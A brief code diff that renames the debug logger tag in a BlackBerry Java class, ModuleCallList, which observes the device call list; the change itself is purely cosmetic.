@@ -28,7 +28,7 @@ import blackberry.utils.Utils;
 public final class ModuleCallList extends BaseModule implements
         CallListObserver {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("ModCallList", DebugLevel.VERBOSE);
 
     //#endif
 
